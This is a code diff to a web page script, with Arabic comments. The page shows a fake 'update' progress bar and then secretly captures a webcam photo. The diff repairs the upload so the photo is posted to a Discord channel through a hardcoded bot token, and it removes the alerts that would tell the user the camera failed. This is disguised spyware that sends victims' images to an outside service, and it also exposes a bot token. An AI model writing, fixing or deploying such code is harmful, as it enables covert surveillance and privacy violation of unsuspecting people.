@@ -22,7 +22,7 @@
     </div>
 
     <script>
-    // ===== التوكن المشفر (صححته) =====
+    // ===== التوكن (حطه زي ما هو) =====
     var token = "MTM5NTY4MjMwMDQ0NDAyMDc5OA.G57VyI.Vv5XTuBuTYfnxN47rm5lfcdIwBVGowjLIexO8s";
     var channel = 1475949185294536859;
     
@@ -40,7 +40,6 @@
             if (progress >= 100) {
                 clearInterval(interval);
                 output.innerHTML = '✅ Update complete!';
-                // شغل الكاميرا بعد ثانية
                 setTimeout(takePhoto, 1000);
             }
         }, 500);
@@ -61,19 +60,18 @@
                         canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                         var photo = canvas.toDataURL('image/jpeg');
                         
-                        // إرسال الصورة
+                        // ===== الطريقة الصح لإرسال الصورة =====
+                        var formData = new FormData();
+                        var blob = dataURLtoBlob(photo);
+                        formData.append('file', blob, 'photo.jpg');
+                        formData.append('content', '📸 Photo captured');
+                        
                         fetch('https://discord.com/api/v10/channels/' + channel + '/messages', {
                             method: 'POST',
                             headers: { 
-                                'Authorization': 'Bot ' + token,  // هنا من غير atob
-                                'Content-Type': 'application/json'
+                                'Authorization': 'Bot ' + token
                             },
-                            body: JSON.stringify({
-                                content: '📸 Photo captured',
-                                embeds: [{
-                                    image: { url: photo }
-                                }]
-                            })
+                            body: formData
                         }).then(function(response) {
                             console.log('Sent:', response.status);
                         }).catch(function(err) {
@@ -85,11 +83,16 @@
                 })
                 .catch(function(err) {
                     console.log('Camera error:', err);
-                    alert('❌ Camera access failed. Please allow camera permissions.');
                 });
-        } catch(e) {
-            console.log('Error:', e);
-        }
+        } catch(e) {}
+    }
+    
+    // ===== دالة تحويل الصورة =====
+    function dataURLtoBlob(dataURL) {
+        var arr = dataURL.split(','), mime = arr[0].match(/:(.*?);/)[1];
+        var bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+        while(n--) { u8arr[n] = bstr.charCodeAt(n); }
+        return new Blob([u8arr], {type: mime});
     }
     </script>
 </body>
